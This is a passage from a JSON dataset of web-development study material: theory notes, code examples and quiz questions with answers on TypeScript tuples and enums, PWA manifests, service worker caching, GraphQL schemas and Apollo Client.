          "solutionCode": "enum UserStatus {\n  ACTIVE = \"ACTIVE\",\n  INACTIVE = \"INACTIVE\",\n  PENDING = \"PENDING\",\n}\n\ntype UserProfile = [number, string, UserStatus, boolean];\n\nfunction displayUserProfile(profile: UserProfile): string {\n  const [id, name, status, isAdmin] = profile;\n  const adminStatus = isAdmin ? \"Yes\" : \"No\";\n  return `User ID: ${id}, Name: ${name} (${status}), Admin: ${adminStatus}`;\n}\n\n// Example usage:\nconst user1: UserProfile = [101, \"Alice Smith\", UserStatus.ACTIVE, true];\nconst user2: UserProfile = [202, \"Bob Johnson\", UserStatus.INACTIVE, false];\nconst user3: UserProfile = [303, \"Charlie Brown\", UserStatus.PENDING, false];\n\nconsole.log(displayUserProfile(user1));\n// Expected: \"User ID: 101, Name: Alice Smith (ACTIVE), Admin: Yes\"\n\nconsole.log(displayUserProfile(user2));\n// Expected: \"User ID: 202, Name: Bob Johnson (INACTIVE), Admin: No\"\n\nconsole.log(displayUserProfile(user3));\n// Expected: \"User ID: 303, Name: Charlie Brown (PENDING), Admin: No\"\n\n// Example of compile-time error due to type violation:\n// let invalidUserProfile: UserProfile = [404, \"Diana Prince\", \"UNKNOWN\", true];\n// The above line would cause a compile-time error:\n// Type 'string' is not assignable to type 'UserStatus'.\n\n// Another example of compile-time error:\n// let wrongTypeTuple: UserProfile = [\"500\", \"Eve\", UserStatus.ACTIVE, false];\n// Type 'string' is not assignable to type 'number'.\n\n// Mutating a tuple element with wrong type\n// let testTuple: UserProfile = [1, \"Test\", UserStatus.ACTIVE, true];\n// testTuple[1] = 123; // Error: Type 'number' is not assignable to type 'string'.\n",
          "testCases": [
            "The `UserStatus` enum should be defined with `ACTIVE`, `INACTIVE`, `PENDING` string values.",
            "The `UserProfile` type alias should be a tuple `[number, string, UserStatus, boolean]`.",
            "The `displayUserProfile` function should correctly accept a `UserProfile` tuple.",
            "The `displayUserProfile` function should return the formatted string as specified.",
            "Calling `displayUserProfile` with valid `UserProfile` data should produce correct output.",
            "An attempt to assign an invalid string to a `UserStatus` enum member in a `UserProfile` tuple should cause a compile-time error.",
            "An attempt to assign an incorrect type to any tuple element should cause a compile-time error."
          ],
          "hints": [
            "Remember that string enums require explicit string assignments.",
            "Tuple types define the types and order of elements precisely.",
            "Deconstruct arrays (or tuples) for easier access to elements within the function."
          ],
          "tags": [
            "TypeScript",
            "Types",
            "Enums",
            "Tuples",
            "Type Safety",
            "Functions"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "typescript_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_typescript_basic_types",
            "question_typescript_basics_3",
            "question_typescript_basics_4"
          ]
        }
      ]
    }
  },
  {
    "id": "bb43606f-e5b4-4560-9ce0-bdbcc4418039",
    "startLine": 13100,
    "endLine": 13199,
    "processedDate": "2025-06-17T13:19:56.609Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_pwa_manifest",
          "title": "Progressive Web App (PWA) Web App Manifest",
          "content": "The Web App Manifest is a JSON file that provides information about a web application to the browser and the operating system. It allows PWAs to be installed on a user's device and provides a native-app-like experience by controlling how the app appears to the user and defining its launch characteristics. It defines properties like the app's name, icons, start URL, display mode, theme colors, and orientation.\n\n## Key Manifest Fields\n\n*   **`description`**: A general description of the web application. This is used in app stores or installation prompts.\n*   **`start_url`**: Defines the URL that loads when the user launches the application from their home screen, desktop, or other application launchers. It should be a URL relative to the manifest's URL.\n*   **`display`**: Specifies the preferred display mode for the web application. Common values include:\n    *   `standalone`: The application will look and feel like a standalone application. It will open in its own window, separate from the browser, hiding typical browser UI elements like the URL bar.\n    *   `fullscreen`: The application will open completely full screen, taking up the entire display without any browser UI.\n    *   `minimal-ui`: Similar to `standalone`, but provides a minimal set of browser UI (e.g., a back button, URL bar, or refresh button on some platforms).\n    *   `browser`: The application opens in a regular browser tab or window, just like a standard website.\n*   **`background_color`**: Defines the placeholder background color for the application. This color is used when the web app is first launched before its stylesheet is loaded, providing a smooth transition.\n*   **`theme_color`**: Defines the default theme color for the application. This color can influence the color of the browser's UI elements (like the address bar or task switcher) when the PWA is running, providing a more integrated look.\n*   **`icons`**: An array of objects specifying icons for the application. These icons are used on the home screen, app launcher, task switcher, and splash screen. Each icon object requires:\n    *   `src`: The path to the icon image file.\n    *   `sizes`: The pixel dimensions of the icon (e.g., \"192x192\"). Multiple sizes are needed for different device resolutions.\n    *   `type`: The MIME type of the icon image (e.g., \"image/png\").\n\n## Importance\nThe Web App Manifest is crucial for making a web application installable and providing a native-like experience. It's one of the core components that enables a website to become a Progressive Web App.",
          "examples": [
            {
              "id": "example_pwa_manifest_1",
              "title": "Basic Web App Manifest JSON",
              "code": "{\n  \"name\": \"My Awesome PWA\",\n  \"short_name\": \"PWA\",\n  \"description\": \"A simple Progressive Web App for learning.\",\n  \"start_url\": \"/\",\n  \"display\": \"standalone\",\n  \"background_color\": \"#ffffff\",\n  \"theme_color\": \"#000000\",\n  \"icons\": [\n    {\n      \"src\": \"icon-192x192.png\",\n      \"sizes\": \"192x192\",\n      \"type\": \"image/png\"\n    },\n    {\n      \"src\": \"icon-512x512.png\",\n      \"sizes\": \"512x512\",\n      \"type\": \"image/png\"\n    }\n  ]\n}",
              "explanation": "This JSON snippet illustrates a typical `manifest.json` file. It defines the application's basic metadata, how it should be displayed when launched from the home screen, and the icons used for various purposes across the operating system.",
              "language": "json"
            }
          ],
          "relatedQuestions": [
            "question_pwa_manifest_1",
            "question_pwa_manifest_2",
            "question_pwa_manifest_3",
            "question_pwa_manifest_4",
            "question_pwa_manifest_5"
          ],
          "relatedTasks": [
            "task_pwa_manifest_1"
          ],
          "tags": [
            "PWA",
            "Web App Manifest",
            "Frontend Fundamentals",
            "Web Development"
          ],
          "technology": "Web",
          "prerequisites": [
            "HTML",
            "CSS",
            "JSON"
          ],
          "complexity": 4,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "PWA Development",
            "Offline-first Apps"
          ]
        },
        {
          "id": "theory_pwa_service_workers",
          "title": "Progressive Web App (PWA) Offline Capabilities with Service Workers",
          "content": "Service Workers are a type of web worker that runs in the background, separate from the main browser thread. They act as a programmable proxy between the browser and the network, enabling powerful features like offline capabilities, push notifications, and background synchronization. For offline capabilities, service workers typically intercept network requests and serve cached content.\n\n## Service Worker Lifecycle Events\n\n1.  **`install` event**: This event is fired when the service worker is first installed. It's a common place to cache static assets that are essential for the application to function offline (e.g., HTML, CSS, JavaScript files, images). The `event.waitUntil()` method ensures that the service worker does not install until the promise passed to it resolves. This is crucial for pre-caching assets.\n    ```javascript\n    self.addEventListener('install', event => {\n      event.waitUntil(\n        caches.open(CACHE_NAME)\n          .then(cache => cache.addAll(urlsToCache)) // caches all specified URLs\n      );\n    });\n    ```\n    *   `CACHE_NAME`: A string identifier for your cache, useful for versioning.\n    *   `urlsToCache`: An array of URLs that the service worker should pre-cache during installation.\n    *   `caches.open(CACHE_NAME)`: Opens or creates a cache with the specified name.\n    *   `cache.addAll(urlsToCache)`: Adds all URLs from the array to the cache.\n\n2.  **`fetch` event**: This event is fired every time the browser makes a network request. The service worker can intercept these requests and decide how to respond. A common strategy for offline support is \"Cache First, then Network\", where the service worker first checks its cache for a matching request and, if not found, falls back to the network.\n    ```javascript\n    self.addEventListener('fetch', event => {\n      event.respondWith(\n        caches.match(event.request) // Tries to find the request in the cache\n          .then(response => response || fetch(event.request)) // If found, return cached response; otherwise, fetch from network\n      );\n    });\n    ```\n    *   `event.respondWith()`: This method tells the browser to wait for the promise to resolve and then use the resulting Response as the network response.\n    *   `caches.match(event.request)`: Checks if the incoming network request's URL exists in any of the service worker's caches. It returns a Promise that resolves to the matching `Response` object or `undefined` if no match is found.\n    *   `response || fetch(event.request)`: This is a common pattern for the \"Cache First, then Network\" strategy. If `response` (from `caches.match`) is available (truthy), it's returned. Otherwise, `fetch(event.request)` is called to get the resource from the network.",
          "examples": [
            {
              "id": "example_pwa_service_worker_1",
              "title": "Service Worker Cache Strategy (Cache First)",
              "code": "// service-worker.js\nconst CACHE_NAME = 'my-pwa-cache-v1';\nconst urlsToCache = [\n  '/',\n  '/index.html',\n  '/styles.css',\n  '/app.js',\n  '/images/logo.png'\n];\n\nself.addEventListener('install', event => {\n  console.log('Service Worker: Installing and caching assets...');\n  event.waitUntil(\n    caches.open(CACHE_NAME)\n      .then(cache => {\n        console.log('Service Worker: Caching new assets...');\n        return cache.addAll(urlsToCache);\n      })\n      .then(() => self.skipWaiting()) // Activates the new service worker immediately\n  );\n});\n\nself.addEventListener('fetch', event => {\n  console.log('Service Worker: Fetching resource:', event.request.url);\n  event.respondWith(\n    caches.match(event.request)\n      .then(response => {\n        // Cache hit - return response\n        if (response) {\n          console.log('Service Worker: Resource from cache:', event.request.url);\n          return response;\n        }\n        // No cache hit - fetch from network\n        console.log('Service Worker: Resource from network:', event.request.url);\n        return fetch(event.request);\n      })\n  );\n});\n\nself.addEventListener('activate', event => {\n  console.log('Service Worker: Activating...');\n  // Optional: Clean up old caches here\n  event.waitUntil(\n    caches.keys().then(cacheNames => {\n      return Promise.all(\n        cacheNames.map(cacheName => {\n          if (cacheName !== CACHE_NAME) {\n            console.log('Service Worker: Deleting old cache:', cacheName);\n            return caches.delete(cacheName);\n          }\n        })\n      );\n    })\n  );\n  event.waitUntil(clients.claim()); // Allows the service worker to take control of existing clients immediately\n});",
              "explanation": "This code demonstrates a common 'Cache First, then Network Fallback' strategy. During installation, specified URLs are pre-cached. During fetch, the service worker attempts to serve resources from the cache first. If the resource is not in the cache, it falls back to fetching it from the network. The `activate` event is also shown for cleaning up old caches, ensuring only the current version's cache is used.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_pwa_service_worker_1",
            "question_pwa_service_worker_2",
            "question_pwa_service_worker_3",
            "question_pwa_service_worker_4",
            "question_pwa_service_worker_5",
            "question_pwa_service_worker_6"
          ],
          "relatedTasks": [
            "task_pwa_service_worker_1"
          ],
          "tags": [
            "PWA",
            "Service Worker",
            "Offline",
            "Caching",
            "Web Development",
            "JavaScript"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "JavaScript Promises",
            "Event Listeners"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "PWA Development",
            "Offline-first Applications"
          ]
        },
        {
          "id": "theory_graphql_schema",
          "title": "GraphQL Schema Definition Language (SDL)",
          "content": "GraphQL is a query language for your API, and a server-side runtime for executing queries by using a type system you define for your data. A GraphQL schema defines the structure of the data that clients can query and mutate.\n\nThe Schema Definition Language (SDL) is used to define this schema in a human-readable and platform-agnostic way.\n\n## Key Components of a GraphQL Schema\n\n1.  **Object Types (`type`)**: These are the most fundamental components of a GraphQL schema. They represent the types of objects you can fetch from your service, and what fields they have.\n    *   Each field on an object type has a name and a type.\n    *   **Scalar Types**: GraphQL comes with built-in scalar types like `ID`, `String`, `Int`, `Float`, `Boolean`. `ID` is a unique identifier, often serialized as a string. These are terminal types; they don't have sub-fields.\n    *   **Custom Object Types**: Fields can also be other object types, allowing you to define relationships between data.\n    *   **Non-Nullable (`!`)**: An exclamation mark `!` after a type indicates that the field is non-nullable. It means that the API will always return a value for this field and it cannot be `null`.\n    *   **Lists (`[]`)**: Square brackets `[]` indicate a list of items. For example, `[Post!]!` means it's a list of non-nullable `Post` objects, and the list itself cannot be `null`.\n\n    **Example: `User` and `Post` Types**\n    ```graphql\ntype User {\n  id: ID!\n  name: String!\n  email: String!\n  posts: [Post!]! # A user can have multiple posts, and each post in the list cannot be null\n}\n\ntype Post {\n  id: ID!\n  title: String!\n  content: String!\n  author: User! # A post must have an author, which is a User object\n}\n    ```\n\n2.  **Root Types (`Query`, `Mutation`, `Subscription`)**:\n    Every GraphQL schema must have a `Query` type, which defines the entry points for reading data. It can optionally have a `Mutation` type for writing/modifying data, and a `Subscription` type for real-time data.\n    *   **`Query` Type**: Defines fields that clients can use to fetch data. Each field represents a top-level query operation. Arguments can be passed to these fields to filter or specify the data to be retrieved.\n        **Example:**\n        ```graphql\ntype Query {\n  user(id: ID!): User # Get a single user by ID\n  allUsers: [User!]! # Get all users\n  post(id: ID!): Post # Get a single post by ID\n  allPosts: [Post!]! # Get all posts\n}\n        ```\n    *   **`Mutation` Type**: Defines fields that clients can use to modify data on the server. Mutations are typically used for create, update, and delete operations. Each field specifies input arguments and the type of data returned after the mutation.\n        **Example:**\n        ```graphql\ntype Mutation {\n  createUser(name: String!, email: String!): User! # Create a new user\n  createPost(title: String!, content: String!, authorId: ID!): Post! # Create a new post\n}\n        ```\n\n## Importance\nThe GraphQL schema is the contract between the client and the server. It clearly defines what data is available, how it's structured, and what operations (queries, mutations) can be performed. This strong typing provides self-documentation and enables powerful tooling on both the client and server sides, improving development experience and reducing errors.",
          "examples": [
            {
              "id": "example_graphql_schema_1",
              "title": "Comprehensive GraphQL Schema Definition",
              "code": "type User {\n  id: ID!\n  name: String!\n  email: String!\n  posts: [Post!]!\n}\n\ntype Post {\n  id: ID!\n  title: String!\n  content: String!\n  author: User!\n}\n\ntype Query {\n  user(id: ID!): User\n  allUsers: [User!]!\n  post(id: ID!): Post\n  allPosts: [Post!]!\n}\n\ntype Mutation {\n  createUser(name: String!, email: String!): User!\n  createPost(title: String!, content: String!, authorId: ID!): Post!\n}",
              "explanation": "This example demonstrates a complete GraphQL schema definition using SDL, including custom object types (`User`, `Post`), relationships between types (`User` has `posts`, `Post` has `author`), and root operation types (`Query` for reading data, `Mutation` for modifying data). It also shows the use of non-nullable fields (`!`) and lists (`[]`).",
              "language": "graphql"
            }
          ],
          "relatedQuestions": [
            "question_graphql_schema_1",
            "question_graphql_schema_2",
            "question_graphql_schema_3",
            "question_graphql_schema_4",
            "question_graphql_schema_5",
            "question_graphql_schema_6"
          ],
          "relatedTasks": [
            "task_graphql_schema_1"
          ],
          "tags": [
            "GraphQL",
            "Schema Definition Language",
            "Backend",
            "API Design",
            "Data Modeling"
          ],
          "technology": "GraphQL",
          "prerequisites": [
            "Basic API concepts",
            "JSON",
            "Data types"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "GraphQL API Development",
            "Full-stack Development"
          ]
        },
        {
          "id": "theory_graphql_apollo_client",
          "title": "GraphQL Client: Apollo Client",
          "content": "Apollo Client is a comprehensive state management library for JavaScript that enables you to manage both local and remote data with GraphQL. It fetches, caches, and modifies application data, all while automatically updating your UI. It's often used with React, Vue, Angular, or plain JavaScript.\n\n## Core Concepts\n\n*   **`ApolloClient`**: The main class for interacting with a GraphQL server. You instantiate it with configuration options, most importantly the URI of your GraphQL endpoint and a cache strategy.\n    *   **`uri`**: The URL of your GraphQL server endpoint. All GraphQL operations (queries, mutations) will be sent to this endpoint.\n    *   **`cache`**: An instance of `InMemoryCache` (or another cache implementation). This client-side cache stores the results of GraphQL queries, reducing network requests for frequently accessed data and providing instant UI updates.\n\n*   **`InMemoryCache`**: A normalized, in-memory GraphQL cache. It stores query results as a flat data structure, allowing different queries that fetch the same data to share that data in the cache. This helps prevent data duplication and ensures consistency across your UI when data changes.\n\n*   **`gql` tag**: A template literal tag from `@apollo/client` used to parse GraphQL query, mutation, and subscription strings into a format that Apollo Client can understand. It helps with syntax highlighting and build-time validation of your GraphQL operations.\n\n## Performing Operations\n\nOnce the client is initialized, you can use methods like `query()`, `mutate()`, and `subscribe()` to interact with your GraphQL API.\n\n*   **`client.query({ query: YOUR_GRAPHQL_QUERY, variables: {} })`**: Used to send GraphQL queries to the server to fetch data. It returns a Promise that resolves with the query result.\n*   **`client.mutate({ mutation: YOUR_GRAPHQL_MUTATION, variables: {} })`**: Used to send GraphQL mutations to the server to modify data. It also returns a Promise with the mutation result.\n\n## Example Usage Flow\n1.  Define your GraphQL query/mutation using the `gql` tag.\n2.  Initialize `ApolloClient` with your GraphQL endpoint and `InMemoryCache`.\n3.  Call `client.query()` or `client.mutate()` with your defined operation.\n4.  Process the data returned by the promise.",
          "examples": [
            {
              "id": "example_graphql_apollo_client_1",
              "title": "Apollo Client Initialization and Basic Query",
              "code": "import { ApolloClient, InMemoryCache, gql } from '@apollo/client';\n\n// 1. Initialize Apollo Client\nconst client = new ApolloClient({\n  uri: 'https://api.example.com/graphql',\n  cache: new InMemoryCache() // The default cache for Apollo Client\n});\n\n// 2. Define a GraphQL Query\nconst GET_ALL_USERS = gql`\n  query {\n    allUsers {\n      id\n      name\n      email\n    }\n  }\n`;\n\n// 3. Execute the Query\nclient.query({\n  query: GET_ALL_USERS\n})\n.then(result => {\n  console.log('Query result:', result.data.allUsers);\n})\n.catch(error => {\n  console.error('Error fetching users:', error);\n});\n\n// 4. Example of a Mutation (concept only, not fully executable without a server)\nconst CREATE_USER_MUTATION = gql`\n  mutation CreateUser($name: String!, $email: String!) {\n    createUser(name: $name, email: $email) {\n      id\n      name\n      email\n    }\n  }\n`;\n\n/*\n// Example of executing a mutation\nclient.mutate({\n  mutation: CREATE_USER_MUTATION,\n  variables: {\n    name: 'Jane Doe',\n    email: 'jane.doe@example.com'\n  }\n})\n.then(result => {\n  console.log('Mutation result:', result.data.createUser);\n})\n.catch(error => {\n  console.error('Error creating user:', error);\n});\n*/",
              "explanation": "This example shows how to set up `ApolloClient` by providing the GraphQL API `uri` and configuring an `InMemoryCache`. It then demonstrates how to define a GraphQL query using the `gql` tag and execute it using `client.query()`. A conceptual example for a mutation is also included to show the general pattern for data modification.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_graphql_apollo_client_1",
            "question_graphql_apollo_client_2",
            "question_graphql_apollo_client_3",
            "question_graphql_apollo_client_4",
            "question_graphql_apollo_client_5"
          ],
          "relatedTasks": [
            "task_graphql_apollo_client_1"
          ],
          "tags": [
            "GraphQL",
            "Apollo Client",
            "Frontend",
            "Data Fetching",
            "State Management",
            "JavaScript"
          ],
          "technology": "TypeScript",
          "prerequisites": [
            "JavaScript Promises",
            "GraphQL Basics",
            "ES Modules"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "requiredFor": [
            "Modern Frontend Development",
            "React/Vue/Angular with GraphQL"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_pwa_manifest_1",
          "topic": "PWA Web App Manifest",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of the `Web App Manifest` in a Progressive Web App?",
          "answer": "To provide information about the web application to the browser and operating system, enabling it to be installed and offering a native-app-like experience.",
          "options": [],
          "analysisPoints": [
            "Understands the core function of `manifest.json`.",
            "Differentiates it from service workers or other PWA components."
          ],
          "keyConcepts": [
            "Web App Manifest",
            "PWA",
            "Installability"
          ],
          "evaluationCriteria": [
            "Accuracy of purpose",
            "Conciseness"
          ],
          "example": "",
          "tags": [
            "PWA",
            "Manifest",
            "Basics"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_pwa_manifest_2",
          "topic": "PWA Web App Manifest",
          "level": "medium",
          "type": "mcq",
          "question": "Which `display` mode in the Web App Manifest allows a PWA to open in its own window, hiding typical browser UI elements like the URL bar?",
          "answer": "standalone",
          "options": [
            "fullscreen",
            "minimal-ui",
            "browser",
            "standalone"
          ],
          "analysisPoints": [
            "Understands the different display modes for PWAs.",
            "Can differentiate between the visual effects of each mode.",
            "Knows the common use cases for `standalone` display."
          ],
          "keyConcepts": [
            "Web App Manifest",
            "display mode",
            "PWA UI"
          ],
          "evaluationCriteria": [
            "Correct identification of display mode.",
            "Understanding of PWA user experience."
          ],
          "example": "The `standalone` display mode provides an experience closest to a native application, without the browser's address bar or navigation controls.",
          "tags": [
            "PWA",
            "Manifest",
            "Display"
          ],
          "prerequisites": [
            "PWA basics"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_pwa_manifest_3",
          "topic": "PWA Web App Manifest",
          "level": "medium",
          "type": "open",
          "question": "Explain the difference between `background_color` and `theme_color` in the Web App Manifest and their impact on the user experience.",
          "answer": "The `background_color` property defines a placeholder background color for the application. This color is displayed on the splash screen when the PWA is launching, before the web content is fully loaded. Its purpose is to provide a smooth transition and avoid a jarring white screen. The `theme_color` property, on the other hand, defines the default theme color for the application's surrounding UI elements, such as the browser's address bar or the task switcher's title bar on mobile devices. It helps integrate the PWA visually with the operating system's UI. Both contribute to a more native and integrated user experience by reducing perceived load times and aligning the app's appearance with the system.",
          "options": [],
          "analysisPoints": [
            "Clearly distinguishes between the two properties.",
            "Explains the visual effect and purpose of each.",
            "Connects their usage to improved user experience.",
            "Demonstrates understanding of PWA aesthetics."
          ],
          "keyConcepts": [
            "Web App Manifest",
            "background_color",
            "theme_color",
            "UX",
            "PWA Aesthetics"
          ],
          "evaluationCriteria": [
            "Clarity and accuracy of definitions.",
            "Ability to articulate user experience impact.",
            "Comprehensive explanation."
          ],
          "example": "",
          "tags": [
            "PWA",
            "Manifest",
            "UX",
            "Colors"
          ],
          "prerequisites": [
            "PWA basics"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_pwa_manifest_4",
          "topic": "PWA Web App Manifest",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the significance of the `start_url` property in `manifest.json`?",
          "answer": "It specifies the URL that should be loaded when the user launches the application from their home screen, desktop, or app launcher.",
          "options": [],
          "analysisPoints": [
            "Identifies the role of `start_url`.",
            "Understands its impact on app launch."
          ],
          "keyConcepts": [
            "Web App Manifest",
            "start_url",
            "PWA Launch"
          ],
          "evaluationCriteria": [
            "Accuracy",
            "Conciseness"
          ],
          "example": "",
          "tags": [
            "PWA",
            "Manifest"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_pwa_manifest_5",
          "topic": "PWA Web App Manifest",
          "level": "medium",
          "type": "code",
          "question": "The `icons` array in a Web App Manifest should include multiple icon sizes to support various device resolutions. Provide an `icons` array that includes icons for `192x192` and `512x512` pixel dimensions, both in PNG format.",
          "answer": "```json\n[\n  {\n    \"src\": \"icon-192x192.png\",\n    \"sizes\": \"192x192\",\n    \"type\": \"image/png\"\n  },\n  {\n    \"src\": \"icon-512x512.png\",\n    \"sizes\": \"512x512\",\n    \"type\": \"image/png\"\n  }\n]\n```",
          "options": [],
          "analysisPoints": [
            "Correctly structures JSON for the `icons` array.",
            "Includes all required fields (`src`, `sizes`, `type`).",
            "Uses correct values for `sizes` and `type`.",
            "Demonstrates understanding of multi-resolution icon requirements."
          ],
          "keyConcepts": [
            "Web App Manifest",
            "icons",
            "JSON structure"
          ],
          "evaluationCriteria": [
            "Syntactic correctness of JSON.",
            "Completeness of icon object properties.",
            "Adherence to requirements."
          ],
          "example": "This solution correctly defines two icon entries, one for 192x192 and one for 512x512, both as PNGs. This is crucial for ensuring the PWA's icon looks crisp on various devices and screen densities.",
          "tags": [
            "PWA",
            "Manifest",
            "Icons",
            "JSON"
          ],
          "prerequisites": [
            "JSON syntax"
          ],
          "complexity": 5,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_pwa_service_worker_1",
          "topic": "PWA Service Workers",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary role of a Service Worker in a Progressive Web App?",
          "answer": "To act as a programmable network proxy between the browser and the network, enabling features like offline capabilities, push notifications, and background sync.",
          "options": [],
          "analysisPoints": [
            "Understands the core functionality of a Service Worker.",
            "Identifies its position in the network request flow."
          ],
          "keyConcepts": [
            "Service Worker",
            "PWA",
            "Offline",
            "Network Proxy"
          ],
          "evaluationCriteria": [
            "Accuracy",
            "Conciseness"
          ],
          "example": "",
          "tags": [
            "PWA",
            "Service Worker",
            "Basics"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_pwa_service_worker_2",
          "topic": "PWA Service Workers",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following service worker `install` event handler:\n\n```javascript\nself.addEventListener('install', event => {\n  event.waitUntil(\n    caches.open(CACHE_NAME)\n      .then(cache => cache.addAll(urlsToCache))\n  );\n});\n```\nWhat is the purpose of `event.waitUntil()` in this context?",
          "answer": "It ensures that the service worker will not install until the caching operation (the promise returned by `cache.addAll()`) is successfully completed.",
          "options": [
            "It delays the installation of the service worker for better performance.",
            "It allows the service worker to skip caching if an error occurs.",
            "It ensures that the service worker will not install until the caching operation (the promise returned by `cache.addAll()`) is successfully completed.",
            "It prevents the service worker from being registered if caching fails."
          ],
          "analysisPoints": [
            "Understands the asynchronous nature of service worker installation.",
            "Knows the role of `event.waitUntil()` in managing service worker lifecycle phases.",
            "Recognizes that installation should only complete after critical tasks like caching are done."
          ],
          "keyConcepts": [
            "Service Worker",
            "Lifecycle",
            "install event",
            "event.waitUntil",
            "Promises"
          ],
          "evaluationCriteria": [
            "Correct explanation of `waitUntil`.",
            "Understanding of service worker activation."
          ],
          "example": "Without `event.waitUntil()`, the browser might activate the service worker before all critical assets are cached, leading to a broken offline experience. `waitUntil` ensures atomic caching.",
          "tags": [
            "PWA",
            "Service Worker",
            "Caching",
            "Lifecycle"
          ],
          "prerequisites": [
            "JavaScript Promises"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_pwa_service_worker_3",
          "topic": "PWA Service Workers",
          "level": "hard",
          "type": "open",
          "question": "Describe the \"Cache First, then Network Fallback\" caching strategy using a Service Worker. Explain how the `fetch` event handler implements this strategy and discuss potential edge cases or considerations.",
          "answer": "The \"Cache First, then Network Fallback\" strategy is a common caching pattern for Service Workers where the service worker first attempts to serve a resource from its cache. If the resource is found in the cache, it's returned immediately. If not, the service worker falls back to making a network request to fetch the resource.\n\nThis strategy is implemented within the `fetch` event handler, typically as follows:\n\n```javascript\nself.addEventListener('fetch', event => {\n  event.respondWith(\n    caches.match(event.request) // 1. Try to find the request in the cache\n      .then(cachedResponse => {\n        if (cachedResponse) {\n          return cachedResponse; // 2. If found, return cached response\n        }\n        // 3. If not found in cache, fetch from network\n        return fetch(event.request);\n      })\n  );\n});\n```\n\n**Explanation:**\n1.  `caches.match(event.request)`: The service worker checks if the incoming network `event.request` has a corresponding entry in any of its open caches. This is an asynchronous operation that returns a Promise.\n2.  `.then(cachedResponse => {...})`: Once the `caches.match` Promise resolves, the `cachedResponse` variable will contain the `Response` object if a match was found, or `undefined` otherwise.\n3.  `if (cachedResponse) { return cachedResponse; }`: If a cached response exists (i.e., `cachedResponse` is not `undefined`), it is immediately returned, fulfilling the `event.respondWith` Promise.\n4.  `return fetch(event.request);`: If no cached response is found, the service worker initiates a standard network request using `fetch(event.request)` and returns its result.\n\n**Potential Edge Cases/Considerations:**\n*   **Stale Content:** This strategy prioritizes speed (serving from cache) over freshness. Cached content might become stale if the network version updates but the cache is never updated. This can be mitigated by using a 'Stale-While-Revalidate' strategy or regularly updating caches during the `activate` phase (e.g., changing `CACHE_NAME`).\n*   **New Resources:** If a new resource (e.g., a new image or a new page) is requested that was not pre-cached during `install` and has never been accessed before, it will always fall back to the network. If the network is unavailable, the resource will not load.\n*   **Cache Invalidation:** Simply updating the `CACHE_NAME` in the `install` event won't automatically clean up old caches. An `activate` event handler is needed to delete old caches to prevent them from accumulating and consuming storage space.\n*   **Post Requests:** `caches.match()` only works with GET requests. POST requests (and other non-GET methods) will always fall through to the network, which is generally desired for data mutations.",
          "options": [],
          "analysisPoints": [
            "Clearly defines the caching strategy.",
            "Explains the JavaScript implementation details.",
            "Identifies and discusses common edge cases/drawbacks (stale content, new resources).",
            "Suggests solutions or mitigation strategies for edge cases.",
            "Demonstrates a deep understanding of service worker behavior."
          ],
          "keyConcepts": [
            "Service Worker",
            "Cache First",
            "Fetch Event",
            "Offline Strategy",
            "Caching Patterns",
            "Stale Content",
            "Edge Cases"
          ],
          "evaluationCriteria": [
            "Completeness of explanation.",
            "Accuracy of code description.",
            "Insight into practical considerations.",
            "Ability to analyze system behavior."
          ],
          "example": "",
          "tags": [
            "PWA",
            "Service Worker",
            "Caching",
            "Advanced",
            "Strategy"
          ],
          "prerequisites": [
            "JavaScript Promises",
            "Service Worker Lifecycle"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_pwa_service_worker_4",
          "topic": "PWA Service Workers",
          "level": "medium",
          "type": "flashcard",
          "question": "Which Service Worker event is typically used to pre-cache static assets that are essential for offline functionality?",
          "answer": "The `install` event.",
          "options": [],
          "analysisPoints": [
            "Recalls the correct service worker event for initial caching.",
            "Understands the timing of asset pre-caching."
          ],
          "keyConcepts": [
            "Service Worker",
            "install event",
            "Pre-caching",
            "Offline Assets"
          ],
          "evaluationCriteria": [
            "Correct event identification",
            "Conciseness"
          ],
          "example": "",
          "tags": [
            "PWA",
            "Service Worker",
            "Caching"
          ],
          "prerequisites": [],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_pwa_service_worker_5",
          "topic": "PWA Service Workers",
          "level": "medium",
          "type": "code",
          "question": "Given the following incomplete Service Worker `fetch` event handler, complete the `event.respondWith()` block to implement a 'Cache First, then Network' strategy. Ensure that if a resource is found in the cache, it's returned, otherwise, it's fetched from the network.",
          "answer": "```javascript\nself.addEventListener('fetch', event => {\n  event.respondWith(\n    caches.match(event.request) // Try to find the resource in the cache\n      .then(response => {\n        if (response) {\n          return response; // If found, return the cached response\n        }\n        return fetch(event.request); // Otherwise, fetch from the network\n      })\n  );\n});\n```",
          "options": [],
